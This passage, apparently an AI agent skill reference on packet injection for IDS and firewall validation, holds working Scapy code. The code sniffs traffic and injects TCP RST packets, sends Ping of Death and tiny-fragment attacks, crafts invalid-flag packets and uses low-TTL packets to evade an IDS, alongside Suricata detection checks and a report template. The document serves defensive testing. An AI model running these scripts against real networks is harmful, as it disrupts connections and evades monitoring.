# performing-packet-injection-attack — 详细参考（由 SKILL.md 拆分）

# Sniff for an active TCP connection and inject RST
def rst_inject(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
        rst = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
        ) / TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            seq=pkt[TCP].ack,
            flags="R"
        )
        send(rst, verbose=0)
        print(f"[*] RST injected: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")

# Sniff for 10 packets and attempt RST injection
print("[*] Listening for TCP ACK packets to inject RST...")
sniff(filter="tcp and host 10.10.20.10", prn=rst_inject, count=10, iface="eth0")
```

### Step 4: Protocol Anomaly Testing

```python
#!/usr/bin/env python3
"""Protocol anomaly packets for IDS/firewall testing."""

from scapy.all import *

target = "10.10.20.10"

# Ping of Death (oversized ICMP - should be blocked)
pod = IP(dst=target) / ICMP() / Raw(load="X" * 65500)
send(fragment(pod), verbose=0)
print("[*] Ping of Death fragments sent")

# Tiny fragment attack (TCP header split across fragments)
tiny_frag = IP(dst=target, flags="MF", frag=0) / Raw(load=bytes(TCP(dport=80, flags="S"))[:8])
tiny_frag2 = IP(dst=target, frag=1) / Raw(load=bytes(TCP(dport=80, flags="S"))[8:])
send(tiny_frag, verbose=0)
send(tiny_frag2, verbose=0)
print("[*] Tiny fragment attack packets sent")

# Invalid TCP flag combinations
invalid_flags = [
    ("SYN+FIN", "SF"),
    ("SYN+RST", "SR"),
    ("FIN only (no session)", "F"),
    ("All flags", "FSRPAUEC"),
]

for name, flags in invalid_flags:
    pkt = IP(dst=target) / TCP(dport=80, flags=flags)
    send(pkt, verbose=0)
    print(f"[*] Sent packet with invalid flags: {name}")

# TTL-based evasion (packets that expire before reaching IDS)
# Assumes IDS is 2 hops away, target is 5 hops
ttl_evade = IP(dst=target, ttl=3) / TCP(dport=80, flags="S")
send(ttl_evade, verbose=0)
print("[*] Low-TTL evasion packet sent (TTL=3)")

# IP options padding
ip_opts = IP(dst=target, options=[IPOption_RR()]) / TCP(dport=80, flags="S")
send(ip_opts, verbose=0)
print("[*] Packet with IP Record Route option sent")
```

### Step 5: Verify IDS Detection

```bash
# Check Snort/Suricata for alerts triggered by injected packets
grep -i "xmas\|null\|land\|smurf\|ping.of.death\|fragment" /var/log/suricata/eve.json | \
  python3 -m json.tool | head -50

# Expected IDS alerts:
# - XMAS scan detected (SID: 2100330)
# - NULL scan detected (SID: 2100331)
# - Land attack detected
# - Smurf attack detected
# - Fragmentation anomaly
# - Invalid TCP flags

# Verify firewall dropped spoofed packets
sudo iptables -L -n -v | grep -i drop

# Check for fragmentation reassembly errors
dmesg | grep -i "fragment\|frag"
```

### Step 6: Document Results

```bash
# Generate test results summary
cat > packet_injection_report.txt << 'EOF'
Packet Injection Test Results
=============================
Date: $(date)
Target: 10.10.20.10
Tester: Security Assessment Team

Test 1: TCP XMAS Scan
  IDS Detection: YES (Suricata SID 2100330)
  Firewall Action: Dropped

Test 2: IP Spoofing (192.0.2.100)
  uRPF Block: YES (packet dropped at edge router)
  IDS Detection: YES (source not in HOME_NET)

Test 3: Fragmentation Overlap
  IDS Detection: YES (stream reassembly anomaly)
  Target Response: Fragments dropped by OS

Test 4: Invalid TCP Flags
  IDS Detection: YES (SYN+FIN, SYN+RST flagged)
  Firewall Action: Dropped
EOF
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Packet Injection** | Crafting and sending network packets with specific header values, payloads, or flag combinations to test network security controls |
| **IP Spoofing** | Setting a false source IP address in crafted packets to test anti-spoofing controls (BCP38, uRPF) or impersonate another host |
| **TCP RST Injection** | Sending forged TCP RST packets to terminate established connections, testing session resilience and connection reset defenses |
| **Fragmentation Attack** | Exploiting IP fragmentation to split malicious payloads across fragments, evading packet inspection that does not reassemble fragments |
| **uRPF (Unicast Reverse Path Forwarding)** | Router-level anti-spoofing mechanism that drops packets if the source IP would not be routable back through the ingress interface |
| **BCP38 (Network Ingress Filtering)** | Best Current Practice for preventing IP spoofing at network borders by filtering packets with source addresses not belonging to the network |

## Tools & Systems

- **Scapy**: Python packet manipulation library for crafting arbitrary network packets with full control over all protocol headers
- **hping3**: Command-line packet generator supporting TCP, UDP, ICMP with control over flags, TTL, window size, and packet rate
- **Nemesis**: Network packet injection tool supporting Ethernet, ARP, IP, TCP, UDP, ICMP, DNS, and other protocols
- **tcpreplay**: Tool for replaying captured PCAP files at controlled rates for testing IDS rules against known traffic patterns
- **Nping**: Nmap's packet generation tool for crafting probes with arbitrary TCP/UDP/ICMP headers

## Common Scenarios

### Scenario: Validating IDS Rules After Deployment

**Context**: A SOC team deployed new Suricata rules for detecting reconnaissance and evasion techniques. They need to validate that the rules trigger correctly before going live. The testing is performed in a staging environment replicating the production network.

**Approach**:
1. Craft XMAS, NULL, and FIN scan packets using Scapy and send to test targets to verify scan detection rules
2. Generate packets with invalid TCP flag combinations (SYN+FIN, SYN+RST) to test protocol anomaly rules
3. Send oversized ICMP packets and fragmented payloads to test fragmentation detection rules
4. Inject packets with spoofed source IPs to verify anti-spoofing rules fire correctly
5. Send TCP RST injection packets during an active HTTP session to test session disruption detection
6. Verify that all expected Suricata alerts appear in the EVE JSON log with correct severity and metadata
7. Document which rules fired, which did not, and recommend rule tuning for any gaps

**Pitfalls**:
- Sending injection packets too fast and overwhelming the test network or IDS sensor
- Crafting packets with incorrect checksum calculations, causing them to be silently dropped before reaching the IDS
- Not accounting for stateful firewalls that drop out-of-state packets before they reach the IDS for inspection
- Testing from behind a NAT that modifies source ports and breaks crafted TCP sequences

## Output Format

```
## Packet Injection Test Report

**Target**: 10.10.20.10 (test-server-01)
**IDS Sensor**: suricata-staging-01
**Test Date**: 2024-03-15

### Test Matrix

| Test | Packet Type | Expected Detection | Actual Result |
|------|-------------|-------------------|---------------|
| 1 | TCP XMAS Scan | SID 2100330 | DETECTED |
| 2 | TCP NULL Scan | SID 2100331 | DETECTED |
| 3 | SYN+FIN Invalid | SID 2100332 | DETECTED |
| 4 | IP Spoofed Source | SID 2003000 | DETECTED |
| 5 | Land Attack | SID 2100333 | NOT DETECTED |
| 6 | Fragment Overlap | SID 2200001 | DETECTED |
| 7 | Ping of Death | SID 2100334 | DETECTED |
| 8 | TCP RST Injection | Custom SID | NOT DETECTED |

### Detection Rate: 6/8 (75%)

### Gaps Identified
1. Land attack (src==dst) not detected -- add rule SID 2100333
2. TCP RST injection not detected -- create custom rule for out-of-window RST
```
